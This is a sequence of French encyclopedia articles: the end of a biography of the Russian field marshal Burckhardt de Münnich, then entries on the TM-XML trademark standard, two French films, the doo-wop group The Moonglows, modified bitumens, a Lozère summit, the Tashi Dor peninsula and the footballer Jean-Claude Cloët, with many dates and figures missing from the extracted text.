L'impératrice le nomme feld-maréchal le et le place à la tête de l'administration militaire. Le comte Burckhardt de Münnich commence à réformer l'armée pour la mettre au niveau des autres pays européens. Le comte et Biron, jaloux l'un de l'autre, mais rapprochés par la politique, se partagent l'autorité pendant ce règne.
En 1731, il est ministre d'État. En outre, il est, l'année suivante, maréchal et président du Collège militaire.
Le comte a réorganisé l'armée nationale russe. Sur son initiative la Garde impériale devient une unité d'élite de . Il crée deux régiments : un régiment d'infanterie, le régiment Izmaïlovski, nommé d'après un village proche de Moscou, où se trouve le manoir familial de l'impératrice, et un régiment de cavalerie, le régiment des dragons de la Garde de Menchikov, très vite renommé régiment des Gardes du Corps à cheval ; cette dernière unité était destinée à rassembler tous les anciens officiers de la Garde à cheval de Pierre le Grand, qui ne remplissaient jusqu'alors, et de manière temporaire, que des fonctions honorifiques. Ils portent des cuirasses. De plus, il forme des unités d'ingénieurs ; son école du corps d'infanterie des cadets gentilshommes ouverte à quatre ou cinq cents jeunes nobles ou fils de notables va fournir pendant presque deux siècles les futures générations d'officiers supérieurs des armées russes. Les exercices physiques et militaires et l'étude des langues étrangères, de l'art de la guerre et de la science sont une nouveauté en Russie. Enfin, Münnich modifie, toujours en 1732, le système du recrutement en Russie. Une recrue pour 350 paysans avec possibilité de rachat.
En outre, il fait venir des officiers étrangers et augmente les soldes. Münnich crée douze régiments de cuirassiers et des unités de hussards. Le prince Eugène approuve ses réformes.
Voltaire nous dit à propos de la Russie vers 1730 que : 
La guerre de Succession de Pologne.
La tsarine Anne le nomme ministre de la Guerre et membre du Conseil privé de l'impératrice, surnommé "le parti des Allemands". Le comte Osterman et Biron, les favoris, l'éloignent de la cour en 1733 et lui confient la guerre de Succession de Pologne. Bühren, qui francise son nom en Biron, s'entoure lui-même pourtant de ministres et généraux allemands, dont le but essentiel est de s'enrichir. Ensemble, ils inaugurent en Russie un régime de terreur, favorisent la délation, déboussolent le pays. On appelle cette époque la "bironovchtchina".
Arrivé au front, Münnich chasse Stanislas Leszczynski de Pologne (1734). En 1735, Münnich prend Dantzig. Osterman et Biron critiquent la durée du siège, mais Münnich est en infériorité numérique. De plus, il n'a presque pas d'artillerie à sa disposition. Le comte de Münnich enseigne aux Russes l'art de conduire des sièges comme Pierre le Grand leur avait appris à gagner des batailles et il réussit à priver les Polonais du secours de la mer.
Münnich fait payer aux habitants de Dantzig leur dévouement à la cause de Stanislas. Il place le prince Poniatowski sur le trône de Pologne.
Guerre russo-turque (1735-1739).
La tsarine, excitée par le comte de Münnich et par plusieurs autres étrangers, résolut de réparer, par la guerre contre les Ottomans, des siècles de revers militaires et de pertes de territoires.
Münnich entame cette guerre à l'automne 1735. Le 20 mai, au début de la campagne, il combat Tatars de Crimée, armés par les Ottomans. Il ne parvient pas à soumettre la Sublime Porte, mais il porte ses armes jusqu'à la forteresse d'Azov qu'il prend en octobre 1736. Puis, il libère la Crimée du joug ottoman avec seulement . transportent le ravitaillement et les munitions dans ces contrées désertiques. Des bandes armées tartares les attaquent sans cesse. Ils inventent les bataillons progressant en formation carrée.
Au bout de l'isthme qui joint la Crimée au continent, les armées de Münnich se retrouvent en face d'un profond fossé protégé par six tours et la forteresse de Perekop. En deux jours il franchit le fossé, et met en déroute Tartares. Il prend Perekop le , 
Ses généraux lui conseillent de bâtir un camp retranché et de se préparer aux attaques des Ottomans et des Tartares, mais Münnich décide d'attaquer et, malgré l'échec d'un de ses généraux et l'insubordination d'autres généraux, il prend Kozlov et peut ravitailler ses troupes affamées, et les payer, grâce à un riche butin.
Le , Münnich pénètre dans le camp des Tartares à la tête d'un bataillon de la Garde impériale et les met en déroute. Il prend Bakhtchissaraï et d'autres villes-forteresses. À cause de l'insubordination de ses troupes et d'une grave épidémie, il doit se replier sur la Russie.
Münnich y est accueilli en héros, mais il ne pense qu'à retourner sur les bords de la Mer Noire mener une guerre à outrance contre les Turcs. Il refuse d'envoyer un corps auxiliaire à la Hongrie qui vient d'entrer en guerre et c'est avec qu'il passe le Dniepr, le . Il encercle et prend Otchakov. L'explosion de la poudrière provoque la mort de Turcs.
Münnich refuse une paix séparée avec les Turcs. En 1738, il avance au-delà du Boug et arrive au bord du Dniestr avec . Il reçoit l'ordre de prendre Khotin, malgré un ennemi supérieur en nombre, fortement retranché et des troupes très fatiguées. La peste décime ses troupes. Son armée doit retourner en Russie.
Münnich revient en 1739 en Petite Russie et en Bessarabie, en passant par la Pologne qui est pourtant neutre. À la , il attaque fortement retranchés avec sans bagage. Il comprend que le sort de la Russie est entre ses mains. La Pologne et la Suède s'apprêtent en cas de défaite russe à attaquer l'Empire. voit que du côté gauche les Turcs sont très faibles, croyant être protégés par des marais. Les pontonniers russes construisent vingt ponts et leur armée se jette sur les Turcs qui les attendent du côté droit. L'artillerie de Münnich écrase sous son feu meurtrier janissaires. Le lendemain, il prend Khotin sans combat.
L'Autriche fait la paix, alors que Münnich se dirigeait vers la Grèce pour la conquérir. La tsarine, mal conseillée par Biron fait de même. Au Traité de Belgrade, grâce à Münnich, la Russie acquiert définitivement Azov et la Bessarabie. Toutefois les vaisseaux russes ne peuvent naviguer sur la mer Noire et une partie des conquêtes de Münnich sont rendues aux Turcs. Ses offensives victorieuses ont permis aux Autrichiens de progresser en Valachie et en Bosnie. Seule la menace suédoise n'a pas permis à Münnich d'aller plus loin. Il est décoré par Anna Ivanovna de l'ordre de Saint-André. La gloire de Münnich est sans bornes. L'empereur Charles VI d'Autriche écrit qu'il n'aurait pas signé le Traité de Belgrade avec un tel général.
À partir de cette guerre gagnée par Münnich, les Russes vont avoir du mépris pour les armées ottomanes qu'ils avaient jusqu'ici redoutées.
La paix.
Avant la paix, mais en 1738, le Hongrois Tóth est envoyé par la France auprès du commandant de l'armée russe. Tóth décrit dans son compte-rendu l'état de l'armée russe dont le camp se trouvait sur le bord du Dniestr. L'année suivante, Tóth revoit le comte de Münnich qui propose par l'intermédiaire de l'agent hongrois une alliance russo-française au chef de la diplomatie française. Ce projet n'aboutira pas.
Le comte Burckhardt de Münnich termine la construction du canal du lac Ladoga et ses trente-deux écluses en 1738.
Le , le maréchal Münnich, en accord avec la tsarine, fait arrêter le régent Biron qui est emprisonné à la prison de Schlüsselbourg. Cette prison accueille les opposants et les princes ou les politiques victimes des rivalités à la cour.
Au service d'Anna Léopoldovna.
Anna Léopoldovna, mère de l'empereur Ivan VI de Russie, est proclamée régente fin 1740. Münnich devient son Premier ministre, . La régente laisse les ministres gouverner. Münnich crée un "Règlement des fabriques" fixant les relations entre les propriétaires et leurs ouvriers et règlementant la journée de travail.
Il veut faire une alliance avec la Prusse, mais la régente préfère s'allier avec les Autrichiens, d'où une nouvelle répartition des pouvoirs entre les ministres en Russie. Münnich ne conserve que l'armée et restitue les Affaires étrangères au comte Ostermann. Puis, il n'a plus rien. Il tombe très malade et on pense à un empoisonnement. Après sa guérison, la régente lui accorde une pension de et une garde d'honneur. Sa famille et lui vivent paisiblement à Saint-Pétersbourg jusqu'au jour où le pouvoir passe entre d'autres mains.
Des dissensions apparaissent entre les ministres, compromettant la stabilité et le crédit du gouvernement. Par ailleurs, la noblesse russe reproche à la régente le caractère trop germanique de son entourage. Un sentiment national anti-allemand apparaît et l'opinion publique se tourne vers Élisabeth Petrovna, fille de Pierre le Grand et jugée plus « russe » qu'Anna Léopoldovna, et francophile.
L'exil en Sibérie, règne d'Élisabeth.
Le , Münnich est condamné à être écartelé, car il est un partisan du jeune empereur Ivan VI de Russie, emprisonné depuis la prise de pouvoir d'Élisabeth. Cette révolte de palais frappe surtout les officiers, dits étrangers bien que naturalisés, qui étaient à l'origine des victoires de la Russie contre la Pologne ou l'Empire ottoman. L'accusation officielle est « détournement de fonds destiné à un hôpital ». Burckhardt de Münnich est arrêté sur le chemin de la frontière, et ramené à Saint-Pétersbourg pour y être exécuté. Une autre version nous dit qu'il est arrêté dans son lit, même s'il songeait à partir pour la Prusse.
Au dernier moment, il est retiré de l'échafaud, puis envoyé en Sibérie à par l'impératrice, Élisabeth. Pendant vingt ans, de 1742 à 1762, il vit en exil en Sibérie dans la plus affreuse misère. Il occupe la maison de Biron et croise celui-ci venant d'être libéré à Kazan. Burckhardt de Münnich cultive lui-même son petit jardin. Il devient instituteur d'enfants de la région, écrit beaucoup et dessine des plans militaires et civils.
Tous ses biens sont confisqués et son fils, Ernest de Münnich, exilé de la cour. Au bout de quelques d'années d'exil, il réussit à terroriser les fonctionnaires locaux qui craignent d'être châtiés pour leurs abus quand Münnich retournera à la cour. 
Au service de Pierre III de Russie.
Élisabeth décède le . Devenu tsar, Pierre III le rappelle. Münnich a 79 ans, 
Pierre III le comble de bienfaits et lui rend tous ses titres, mais il arrête aussi la guerre au moment où Frédéric II de Prusse apparaît pourtant comme vaincu. En quelques mois, Pierre réussit à se faire détester de tous ceux qui pourraient lui être favorables à la cour. Un premier oukase oblige l'armée à se vêtir d'uniformes prussiens. Un second oblige les popes à se couper la barbe et à s'habiller comme des pasteurs protestants. Les icônes sont enlevées des églises, et les biens du clergé orthodoxe sont confisqués.
Au printemps 1762, Pierre III s'apprête à déclarer la guerre au Danemark afin de s'emparer du Schleswig et de l'annexer à son duché de Holstein. Il assigne Catherine à Peterhof et part rejoindre ses troupes à Cronstadt.
La future tsarine, qui a peur pour sa vie, décide de prendre le pouvoir par la force et de renverser son époux, avec l'aide du comte Panine et des frères Orlov. Ceux-ci soudoient une centaine de soldats des régiments Préobrajenski et Izmaïlovski qui servent d'escorte à Catherine dans sa marche vers Saint-Pétersbourg. Après quelques hésitations, les autres régiments se joignent à eux. À son arrivée dans la capitale, Catherine est accueillie triomphalement et reconnue par le clergé et le sénat.
Au service de Catherine II.
Münnich avait conseillé le tsar face à l'agitation qui a mené Catherine au pouvoir, mais, Pierre était trop faible. Il va être très rapidement assassiné. Il se met néanmoins au service de Catherine. Celle-ci le nomme directeur général des canaux et des ports de Russie. Certes, Münnich veut chasser les Turcs d'Europe et rétablir l'Empire romain d'Orient, mais il n'a plus d'influence politique personnelle sur la conduite de la guerre.
Il meurt à 84 ans et est enterré dans sa propriété non loin de Dorpat (de nos jours Tartu en Estonie).
Hommages.
la Grande Catherine dira de lui « "Si Münnich n'est pas un des enfants de la Russie, il en est l'un des pères" ». Frédéric le Grand professe une grande admiration pour ses exploits et l'appelle « le Prince Eugène des Moscovites ». Voltaire écrit de son côté : "C'était le prince Eugène des Moscovites ; il avait les vertus et les vices des grands généraux : habile, entreprenant, heureux ; mais fier, superbe, ambitieux, et quelquefois trop despotique, et sacrifiant la vie de ses soldats à sa réputation. Franz Lacy, Keith, Löwendal, et d'autres habiles généraux, se formaient dans son école".
D'après Hermann von Manstein, son aide de camp : "Le Comte de Münnich est un vrai contraste de bonnes et de mauvaises qualités. Poli, grossier, humain, emporté, tour à tour, rien ne lui est plus facile que de gagner les cœurs de ceux qui ont affaire à lui. Mais soudain, un instant après, il les traite d'une manière si dure qu'ils sont forcés pour ainsi dire de le haïr. Dans de certaines conditions, on l'a vu généreux, dans d'autres d'une avarice sordide. C'est l'homme du monde qui a l'âme la plus haute et cependant on lui a vu faire des bassesses. L'orgueil est un vice dominant. Dévoré sans cesse par une ambition démesurée, il a tout sacrifié tout au monde pour la satisfaire. Un des meilleurs ingénieurs de l'Europe, il a été aussi un des plus grands capitaines de son siècle. Souvent téméraire dans ses entreprises, il a toujours ignoré ce que c'est que l'impossible. D'une stature haute et imposante, et d'un tempérament robuste et vigoureux, il semble être né général."
Ernst Gideon von Laudon et Franz Lacy ont fait leur apprentissage sous ses ordres devant Otchakov et Khotin.
Burckhardt de Münnich est enterré dans sa terre de Lunia en Livonie. Malgré son rôle de bâtisseur de la Russie moderne, sa tombe fut profanée et en partie détruite par les Soviétiques.
Le dragon portait son nom du temps de la Russie impériale.
Famille et descendance.
Le comte Burckhardt de Münnich a eu dix sept enfants de sa première femme, Christiane Lucretia de Witzleben. Quatre seulement lui survivent, mais ils auront une nombreuse descendance. Il n'a pas d'enfants de sa seconde épouse.
Ernst de Münnich (1707-1788), son fils, est membre du ministère du Commerce. L'impératrice l'emploie principalement à la constitution du Musée de l'Ermitage dont il tient lui-même le catalogue des œuvres les premières années. Et bien qu'il signe, en 1766, un traité de commerce entre la Russie et l'Angleterre, son rôle de fondateur du Musée de l'Ermitage restera son titre de gloire. Le comte Ernest de Münnich est conseiller privé de l'impératrice, chevalier des ordres de Saint-Alexandre-Nevsky et de l'aigle blanc de Pologne.
Madame de Krüdener est l'une de ses arrière-petites-filles.
Son œuvre.
Münnich a écrit plusieurs ouvrages :
Annexes.
Bibliographie.
Plusieurs auteurs ont écrit sur Münnich :

</doc>
<doc id="1873648" url="https://fr.wikipedia.org/wiki?curid=1873648" title="Roman d'Amat">
Roman d'Amat



</doc>
<doc id="1873649" url="https://fr.wikipedia.org/wiki?curid=1873649" title="TM-XML">
TM-XML

TM-XML () est un standard XML ouvert pour le domaine des Marques et pour l'échange des données associées entre les Offices de Propriétés Industrielles ou Intellectuelles ainsi qu'avec les partenaires ou les usagers.
Objectifs.
L’objectif initial a consisté à définir le standard XML pour l’échange des données associées aux marques. Les autres objectifs suivants ont été ajoutés pendant et après la définition de la norme ST.66 de l’Organisation mondiale de la propriété intellectuelle (OMPI):
Historique.
TM-XML a été défini par un groupe de travail créé par l’Office de l’harmonisation dans le marché intérieur (marques, dessins et modèles) (OHMI) en .
Huit versions successives du projet ont été publiées sous forme d’invitations à observations (versions 0.1 à 0.7 et 1.0 du projet) avant la version 1.0 Final publiée le sur son site web TM-XML.org TM-XML.org.
Le document TM-XML version 1.0 Final a été proposé comme base de création de la norme ST.66 de l’OMPI qui a été adopté par le groupe de travail sur les normes et la documentation (Standing Committee on Information Technologies/Standards and Documentations Working Group – SCIT/SDWG) à sa huitième session les 19- à Genève.
Voir aussi.
DS-XML : XML Standard pour les Dessins et Modèles Industriels - Pour détail, voir la Page d’accueil de DS-XML

</doc>
<doc id="1873650" url="https://fr.wikipedia.org/wiki?curid=1873650" title="Eusèbe député">
Eusèbe député

 
Eusèbe député est un film français réalisé en 1938 par André Berthomieu, sorti en 1939.
Synopsis.
Le clerc de notaire Eusèbe Bonbonneau se trouve malgré lui candidat à la députation. En effet, un homme d'affaires véreux, Frazier, a poussé un comparse à usurper l'identité de Bonbonneau pour pouvoir, étant député, obtenir les autorisations nécessaires à la création d'un Casino à Sanceau-les-Bains. Dans cette affaire, Frazier compte bien réaliser de beaux bénéfices. Mais Bonbonneau, le vrai, est élu tandis que le complice de Frazier est arrêté. 
Frazier ne s'embarrasse pas pour si peu et tente de se servir du nouvel élu pour obtenir l'appui ministériel. Le ministre a découvert la combinaison et reproche à Bonbonneau sa crédulité. Celui-ci, navré, démissionne. Il a d'ailleurs, au cours de l'aventure, échafaudé un rêve sentimental qui s'écroule comme le reste. 
Il restera clerc de notaire.

</doc>
<doc id="1873662" url="https://fr.wikipedia.org/wiki?curid=1873662" title="The Moonglows">
The Moonglows

The Moonglows est un groupe américain de rhythm and blues et de doo-wop des années 1951-1972, né à Cleveland dans l'Ohio. Dirigé par Bobby Lester et Harvey Fuqua, ce groupe compte plus tard Marvin Gaye parmi ses membres. Epaulés par le disc jockey Alan Freed, leur titre le plus fameux est "Sincerely", une ballade sensuelle de 1954, écrite par Freed et Fuqua, classée du palmarès rhythm &amp; blues et du classement pop. Mais c'est la reprise de cette chanson par les McGuire Sisters qui se place en tête des charts pop en 1955.
Les Moonglows sont intronisés au en 1999 et au Rock &amp; Roll Hall of Fame en 2000.
Carrière.
Premières années.
Tout juste sortis du service militaire, Harvey Fuqua et Bobby Lester, forment un duo en 1949 à Louisville dans le Kentucky. En 1951, Fuqua s'installe à Cleveland et forme les Crazy Sounds avec les chanteurs Danny Coggins et Prentiss Barnes. Lester les rejoints un peu plus tard.
En 1952, les Crazy Sounds prennent contact avec l'animateur de radio Alan Freed, qui devient leur manager. En 1953, Freed renomme le groupe The Moonglows, d'après son propre surnom, « Moondog ». Ils signent avec Champaign Records, le label de Freed, mais ces enregistrements ont peu de succès. Coggins quitte le groupe et est remplacé par Alexander Walton (parfois connu sous le nom de Pete Graves ou Pete Walton).
En 1953, ils enregistrent pour un autre petit label, Chance, sans plus de réussite. Leur reprise de "Secret Love" de Doris Day est leur meilleure vente. En , Freed obtient un contrat avec la station de radio new-yorkaise WINS. Son succès en tant que diffuseur et animateur de la station apporte au groupe un contrat avec Chess Records.
Succès.
"Sincerely", leur premier single chez Chess, chanté par Lester, atteint la du classement R&amp;B de "Billboard" et la dans le palmarès pop. Enregistrée dans la foulée par les McGuire Sisters, cette reprise est une succès classé dans les charts pop.
En 1955, ils participent au "Rock'n'Roll Jubilee Ball", le premier concert new yorkais présenté par Alan Freed. Le groupe choisit le guitariste Billy Johnson comme cinquième membre, Wayne Bennett les ayant quitté après leur prestation à l'Apollo Theater. Cette même année, le groupe décroche un autre succès R&amp;B avec "Most of All", suivi d'un succès plus modeste avec "We Go Together" en 1956. Chess publie certains des enregistrements du groupe sur sa filiale Checker, crédité sous le nom de Moonlighters.
Pendant la majeure partie de la carrière des Moonglows, le chant principal est partagé entre Lester et Fuqua. Lester préfère les ballades doo-wop, tandis que Fuqua aime mieux les chansons rock 'n' roll. Les deux enregistrent également des duos vocaux. Sur leurs enregistrements, ils sont régulièrement accompagnés par les musiciens de Chess tels Willie Dixon ou Fred Below. Leurs succès suivants, en 1956, comprennent "See Saw", qui culmine au R&amp;B et au du Top 100, et "When I'm with You" qui atteint le R&amp;B. En , le groupe apparaît dans "Rock, Rock, Rock!", l'un des premiers films consacrés au rock 'n' roll, en synchronisation labiale des titres "Over and Over Again" et "I Knew From the Start". Ils placent également deux titres supplémentaires sur le disque de la bande originale publiée par Chess. On les voit interprétant "Barcelona Rock" l'année suivante dans le film "Mister Rock and Roll" de Charles S. Dubin avec Alan Freed en vedette.
A partir de , Fuqua chante la plupart des pistes vocales. En , les Moonglows ont un hit R&amp;B avec leur reprise de "Please Send Me Someone to Love" de Percy Mayfield. À la fin de 1958, "Ten Commandments of Love", conduit par Fuqua, atteint le R&amp;B et le pop ; le groupe y est présenté comme « Harvey and the Moonglows ». Chess sort deux EP et un album, "Look, It's the Moonglows". Le groupe d'origine se sépare à la fin de l'année, ne se produisant plus ensemble que pour des raisons contractuelles.
Groupes dérivés et réunion.
En 1959, Lester entame une carrière solo. Cette même année, Harvey Fuqua, suivant les conseils de Bo Diddley, un autre artiste de Chess, travaille avec les Marquees, où Fuqua rencontre pour la première fois Marvin Gaye. Déménageant le groupe à Chicago, Fuqua recrute rapidement Chuck Barksdale alors que sa formation, The Dells, est temporairement en pause après un accident de voiture impliquant l'un de ses membres. Fuqua renomme le groupe Harvey and the New Moonglows. En , Fuqua chante la ballade "Twelve Months of the Year", qui comprend un passage parlé de Marvin Gaye. Plus tard en 1959, Chess publie la chanson "Unemployment". Sur la face B se trouve "Mama Loocie", qui est la première voix principale de Gaye. La plupart du temps, Fuqua enregistre des pistes en solo et fait souvent la promotion de ses chansons et des New Moonglows à la télévision et dans les films. A cette époque, le groupe enregistre aussi des chœurs pour Etta James et Chuck Berry.
Lester forme son propre groupe, également appelé The Moonglows. En 1959, il fait la une des journaux après avoir été arrêté pour trafic de stupéfiants à Beaumont, au Texas. Au début des années 1960, James Nolan et Reese Palmer quittent le groupe de Fuqua, et Chuck Barksdale retourne chez les Dells. À la fin de 1960, Gaye, Chester Simmons et Fuqua enregistrent (avec, vraisemblablement, des membres des Spinners) les derniers enregistrements des New Moonglows, dont "Junior" et "Beatnik". Ensuite, Gaye déménage à Détroit et signe avec Tamla, une filiale de Motown. En , Fuqua quitte Chess et travaille à Détroit sur ses propres labels, Harvey et Tri-Phi Records, jusqu'à ce qu'il rejoigne l'équipe de production de Motown. Il quitte Motown pour RCA en 1970. 
En 1964, Pete Graves forme un autre Moonglows, comprenant Doc Green, George Thorpe et Bearle Easton. En 1969, Prentiss Barnes prend sa retraite du show business après avoir été blessé dans un accident de voiture.
En 1970, Harvey Fuqua, Bobby Lester et Pete Graves se réunissent sous le nom de Moonglows avec Doc Williams et Chuck Lewis. En 1972, ils enregistrent "Sincerely '72", qui atteint la du classement R&amp;B. L'album "The Return of the Moonglows" sort également cette année-là. Mais la réunion s'avère de courte durée.
Dernières années.
Bobby Lester continue à chanter pour ses propres Moonglows jusqu'à ce qu'il succombe aux complications d'un cancer en 1980, à l'âge de 49 ans. Il est remplacé par Billy McPhatter, le fils de Clyde McPhatter. Fuqua joue avec les Moonglows de Bobby Lester lors de la cérémonie des Grammy Awards de 1983, et ce groupe tourne en tant que Harvey and the Moonglows jusqu'en 1986. Bobby Lester Jr. remplace ensuite McPhatter en tant que chanteur principal des Moonglows.
Ils se produisent également dans l'émission "Doo Wop 50" en 1999, où ils chantent "Sincerely" et "Ten Commandments of Love". La formation est alors composée de Harvey Fuqua, Bruce Martin, Gene Kelley, Peter Crawford et Gary Rodgers.
Billy Johnson meurt à Los Angeles le . Gene Kelley décède en 2008 et Reese Palmer le . Prentiss Barnes et Pete Graves disparaissent en 2006 et Harvey Fuqua, le dernier membre original du groupe survivant, meurt le à Detroit.
Héritage et influence.
Les Moonglows sont intronisés au Vocal Group Hall of Fame en 1999 et au Rock &amp; Roll Hall of Fame en 2000. La chanson "Sincerely" reçoit un Grammy Hall of Fame Award en 2002.
Le groupe est mentionné dans la chanson "René and Georgette Magritte with Their Dog after the War" de Paul Simon, parue sur l'album "Hearts and Bones" en 1983.
Reprises notables.
Plusieurs artistes célèbres ont enregistré des chansons des Moonglows.

</doc>
<doc id="1873663" url="https://fr.wikipedia.org/wiki?curid=1873663" title="Bitume modifié">
Bitume modifié

Les bitumes modifiés sont des liants bitumineux dont les propriétés ont été modifiées par l'emploi d'un agent chimique, qui, introduit dans le bitume de base, en modifie la structure chimique et les propriétés physiques et mécaniques. Ils sont utilisés dans le domaine de la route.
Ils sont codifiés dans la norme NF EN 14023. La norme est plutôt une description qu'une véritable classification en fonction de performances.
Composition.
Ils sont préparés avant emploi dans une unité spécialisée. Les agents chimiques comprennent le caoutchouc naturel, les polymères synthétiques, le soufre et certains composés organométalliques. 
Les principaux agents chimiques utilisés dans la modification des bitumes sont :
Plastomères thermoplastiques.
"• Latex"
Les liants modifiés élastomères.
On distingue les mélanges physiques et les bitumes élastomères obtenus par réticulation.
Les mélanges physiques sont généralement hétérogènes à une échelle de quelques micromètres. La finesse de la structure des bitumes élastomères va directement intervenir sur la stabilité du mélange à chaud et sur ses propriétés physiques sur toute la gamme de température.
Les bitumes élastomères réticulés ont une structure résultant d'une double forme de liaisons extrêmement fines, de l'ordre du micromètre. Cette réaction est irréversible. Ils ont, par rapport au liant initial, des résistances en traction plus élevées, ainsi que des raideurs et des ductilités augmentées.
La modification du bitume par des élastomères induit des différences de comportement rhéologique. Par rapport au bitume pur, le BmP SBS présente, à basse température, des modules plus faibles, donc une meilleure flexibilité. La situation s'inverse à haute température. Pour un bitume donné, cette modification du comportement rhéologique dépend de la nature et de la teneur en polymères.
Les liants modifiés plastomères.
Les bitumes copolymères d'éthylène (EVA, EMA et EBA).
Aux faibles teneurs en polymères (&lt; 5 %), la modification des propriétés est due essentiellement à l'augmentation de la teneur en asphaltènes de la phase bitume. Dans ce cas, le choix du bitume d'origine est prépondérant.
Aux fortes teneurs en polymères, on a affaire à un polymère plastifié par une fraction des maltènes du bitume et c'est le choix du polymère qui conditionne les propriétés du liant. On constate une diminution de la pénétrabilité et une forte augmentation de la température bille-anneau.
Les bitumes copolymères d'éthylène - polyisobutylène (PIB).
L'addition de PIB aux bitumes routiers en diminue la fragilité à froid. L'utilisation conjointe de PIB et d'EVA permet d'améliorer simultanément le comportement à haute et basse température.
À l'exception des liants PIB-EVA, les mélanges bitumes copolymères sont rarement stables au stockage. (Sauf pour des teneurs &lt; 3 % EVA et pour des liants à faible teneur en asphaltènes). Il est nécessaire d'agiter ou de recirculer le liant.
Les bitumes caoutchouc.
Les bitumes caoutchouc non stockables
Fabriqué à partir de poudrette de caoutchouc obtenue par rapage de caoutchouc naturel et synthétique, le bitume caoutchouc présente un caractère élastomère, une haute viscosité à haute température et une bonne flexibilité à basse température.
Les bitumes caoutchouc stockables
Fabriqué à partir de déchets broyés de pneumatiques de camions et de voitures, d'une huile lourde et d'un élastomère synthétique, le bitume caoutchouc présente un très fort allongement à la rupture à basse température.

</doc>
<doc id="1873665" url="https://fr.wikipedia.org/wiki?curid=1873665" title="Sabres">
Sabres



</doc>
<doc id="1873667" url="https://fr.wikipedia.org/wiki?curid=1873667" title="Truc de Fortunio">
Truc de Fortunio

Le truc de Fortunio est un sommet de la Margeride, région naturelle située principalement en Lozère, mais également dans le Cantal et dans la Haute-Loire. Il se situe dans le département de la Lozère, sur la commune de Rieutort-de-Randon, à proximité du truc de Randon et du signal de Randon.
Géographie.
Flore et paysage.
Le truc de Fortunio est un sommet du plateau de Charpal, classé en zone Natura 2000. La flore qui l'entoure est constituée de landes sèches européennes (genêt purgatif), forêts de conifères et pelouses à nard. Tourbières et chaos granitiques complètent le paysage.
Panorama.
La table d'orientation du truc de Fortunio, érigée en 2000 par la communauté des communes de la Terre de Randon, permet d'identifier le parc national des Cévennes avec le mont Lozère et le mont Aigoual, les monts d'Aubrac, les monts du Cantal, les monts Dore, la Margeride avec notamment le roc de Fenestre, le massif du Meygal, le massif du Mézenc ainsi que le lac de Charpal plus bas.
Activités.
Télécommunications.
Le truc de Fortunio est équipé à son sommet d'antennes relais pour la télévision, les radios du service public et la téléphonie mobile afin de desservir le nord de la Lozère et le sud du Cantal. Ce relais, qui utilise une tour d'une hauteur de , est équipé depuis pour émettre la TNT.

</doc>
<doc id="1873670" url="https://fr.wikipedia.org/wiki?curid=1873670" title="Chronologie de New York">
Chronologie de New York

Cette chronologie de New York résume en quelques dates marquantes l'histoire de cette ville, qui s'est échelonnée sur plusieurs siècles.

</doc>
<doc id="1873671" url="https://fr.wikipedia.org/wiki?curid=1873671" title="Tashi Dor">
Tashi Dor

Tashi Dor est une péninsule entrant dans le Lac Namtso depuis sa rive sud, et sur laquelle s'érigent deux collines sacrées. C'est un lieu de pèlerinage bouddhiste ; les fidèles suivent la Kora autour des collines, et parfois autour du lac.
Sur la péninsule s'élève aussi un petit monastère, et dans son flanc se creusent quelques grottes abritant parfois des ermites. Des éleveurs nomades y campent fréquemment. Plusieurs espèces d'oiseaux migratoires nidifient sur les rochers de la péninsule.

</doc>
<doc id="1873673" url="https://fr.wikipedia.org/wiki?curid=1873673" title="Tout feu, tout flamme">
Tout feu, tout flamme

Tout feu, tout flamme est un film français réalisé par Jean-Paul Rappeneau, sorti en 1982.
Synopsis.
Victor Valance a quitté Paris depuis plusieurs années, laissant derrière lui sa mère et ses trois filles, pour réaliser de sombres opérations de casinos aux Bahamas et au Canada. Sa fille aînée, Pauline, est polytechnicienne, au cabinet du ministre des finances, et s'occupe de toute la famille depuis la mort de sa mère.
Victor revient à Paris et, usant de son charme habituel, persuade sa mère de lui donner procuration pour vendre son immeuble et placer l'argent dans la réfection d'un casino au bord du lac Léman. Tout ceci à l'insu de Pauline qui sent l'arnaque, mais finit par être dans l’obligation de voler à son secours.
Production.
Musique.
La musique du film est composée et produite par Michel Berger, dont la bande originale est sortie en vinyle par le label WEA :
Box-office.
Ce film a occupé la au box-office l'année de sa sortie, avec spectateurs en salles.

</doc>
<doc id="1873674" url="https://fr.wikipedia.org/wiki?curid=1873674" title="Jean-Claude Cloët">
Jean-Claude Cloët

Jean-Claude Cloët est un footballeur puis entraîneur français né le à Maresches dans le Nord. Il évolue au poste de défenseur latéral ou central du milieu des années 1970 au milieu des années 1980.
Formé à l'US Valenciennes-Anzin, il devient ensuite une des pièces maîtresse de l'AS Nancy-Lorraine et remporte avec cette équipe la Coupe de France en 1978.
Il devient ensuite directeur du centre de formation de l'AS Nancy-Lorraine et effectue une carrière d'entraîneur notamment à l'US Gravelines.
Biographie.
Joueur.
Jean-Claude Cloët commence le football en 1965 au sein de l'US Villers Pol puis, deux ans plus tard, intègre le FC Pont-sur-Sambre où il est remarqué, en 1969, par l'US Valenciennes Anzin. Après quatre ans de formation dans ce club, il fait ses débuts en équipe première lors de la saison 1973-1974 disputée en division 2.
Défenseur physique, il prend part à 10 matchs de championnat et en fin de saison, le club, qui termine deuxième du groupe A derrière le Lille OSC, dispute les barrages d’accession face au Paris SG. Dans ces rencontres qu'il ne dispute pas, l'axe central étant occupé par Claude Coumba et Jean-Pierre Kuskowiak, le club valenciennois s'incline sur le score de cinq à trois et reste en deuxième division. L'année suivante, le club remonte en division 1 après sa première place dans le groupe A. Dans le match des champions, l'USVA s'incline face à l'AS Nancy-Lorraine sur le score de quatre à zéro sur les deux rencontres. Lors de cette saison, Jean-Claude Cloët connaît sa première sélection en équipe de France amateur. Il est titularisé le dans l'axe central de la défense française pour affronter l'équipe d'Allemagne amateur. Les Français s'imposent sur le score de deux à zéro. En fin de contrat avec l'USVA, Jean-Claude Cloët reçoit alors des propositions du FC Metz et de l'AS Monaco mais, il préfère s'engager avec l'AS Nancy-Lorraine en raison de la présence de son frère à Nancy.
En début de saison, il dispute avec l'équipe de France amateurs, les Jeux méditerranéens, les Français atteignent la finale où ils sont battus par l'équipe d'Algérie, Jean-Claude Cloët ne dispute qu'une rencontre lors de cette compétition au poste d'arrière latéral en remplacement du titulaire Paul Marchioni. Après une première saison où il ne dispute que quinze rencontres, il devient titulaire au poste de latéral gauche en 1976. Menés par Michel Platini, les Nancéiens terminent à la quatrième place du championnat puis l'année suivante. La même année, l'AS Nancy-Lorraine atteint la finale de la coupe de France en n'encaissant que deux buts en dix matchs. Opposés à l'OGC Nice, les Nancéiens s'imposent sur le score de un à zéro grâce à un but de Michel Platini à la .
